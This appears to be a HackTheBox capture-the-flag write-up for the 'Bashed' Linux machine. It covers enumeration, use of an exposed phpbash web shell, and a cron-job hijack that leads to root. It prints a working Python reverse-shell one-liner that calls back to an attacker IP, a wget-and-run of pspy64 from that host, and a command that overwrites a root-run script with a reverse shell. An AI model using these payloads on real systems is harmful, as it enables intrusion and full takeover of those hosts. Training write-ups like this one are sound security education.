# Bashed — Web Shell + Cron Job Privilege Escalation

**Platform:** HackTheBox  
**OS:** Linux (Ubuntu 16.04)  
**Difficulty:** Easy  
**IP:** 10.10.10.68  
**Access:** root

---

## 1. Enumeration

```bash
nmap -sV -sC -sS 10.10.10.68
```

Open ports:
- 80 — Apache 2.4.18

```bash
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Discovered `/dev/` — contained phpbash web shell.

---

## 2. Initial Access

Navigated to `/dev/phpbash.php` — direct command execution as `www-data`.

Upgraded to reverse shell via Python:

```bash
nc -lvnp 6666  # attacker machine
```

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),-2);p=subprocess.call(["/bin/sh","-i"])
```

Stabilized shell:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 3. Lateral Movement

```bash
sudo -l
# www-data can run ANY command as scriptmanager (no password)
sudo -u scriptmanager /bin/bash
```

Found `/scripts/` directory with `test.py` (owned by scriptmanager) and `test.txt` (owned by root) — cron job indicator.

---

## 4. Privilege Escalation — Cron Job Hijack

Confirmed with pspy64:
```bash
cd /tmp && wget http://10.10.14.13/pspy64 && chmod +x pspy64 && ./pspy64
```

Root was executing `test.py` periodically. Overwrote it:

```bash
nc -lvnp 7777  # new listener
echo 'import socket,subprocess,os;s=socket.socket(...7777...);...' > /scripts/test.py
```

Root shell received when cron executed.

---

## 5. Flags

| Flag | Path |
|------|------|
| User | /home/alex/user.txt |
| Root | /root/root.txt |

---

## 6. Attack Chain

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap + Gobuster | Found phpbash in /dev |
| 2 | Web Shell | RCE as www-data |
| 3 | Python reverse shell | Interactive shell |
| 4 | sudo -u scriptmanager | Lateral movement |
| 5 | Cron job hijack | Root shell |

---

## 7. Lessons Learned

- Dev tools left on production servers = direct RCE path
- Overly permissive sudo rules allow trivial lateral movement
- Root cron jobs running user-writable scripts = classic PrivEsc
- pspy64 is essential for process monitoring without root
